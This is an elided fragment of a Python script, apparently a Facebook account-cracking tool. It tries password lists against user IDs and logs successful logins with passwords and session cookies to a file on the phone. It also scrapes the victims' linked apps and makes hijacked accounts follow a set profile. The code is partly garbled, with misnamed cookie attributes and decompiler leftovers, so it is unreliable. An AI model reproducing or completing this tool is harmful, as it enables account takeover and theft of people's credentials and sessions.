...
def cek_apk(session,cid):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cid={"cid":cid}).text
    ...
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cid={"cid":cid}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
...
def follow(self, session, cid):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cid',)).text, 'html.parser')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            log_cid=session.cid.get_dict().keys()
            if 'c_user' in log_cid:
                cid=";".join([key+"="+value for key,value in session.cid.get_dict().items()])
                cid = cid[7:22]
                print('\r\r\033[1;32m[SAHAN-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m CID = \033[1;32m'+cid+  '  ''  \033[0;97m')
                cek_apk(session,cid)
                open('/sdcard/SAHAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cid:
                cid=";".join([key+"="+value for key,value in session.cid.get_dict().items()])
                cid = cid[24:39]
